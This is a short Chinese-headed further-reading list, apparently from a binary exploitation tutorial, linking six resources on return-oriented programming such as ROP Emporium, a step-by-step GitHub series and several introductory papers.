## 更多资料

- [ROP Emporium](https://ropemporium.com)
- [一步一步学 ROP 系列](https://github.com/zhengmin1989/ROP_STEP_BY_STEP)
- [64-bit Linux Return-Oriented Programming](http://crypto.stanford.edu/~blynn/rop/)
- [Introduction to return oriented programming (ROP)](http://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html)
- [Return-Oriented Programming:Systems, Languages, and Applications](https://cseweb.ucsd.edu/~hovav/dist/rop.pdf)
- [Practical Return-Oriented Programming](https://trailofbits.files.wordpress.com/2010/04/practical-rop.pdf)
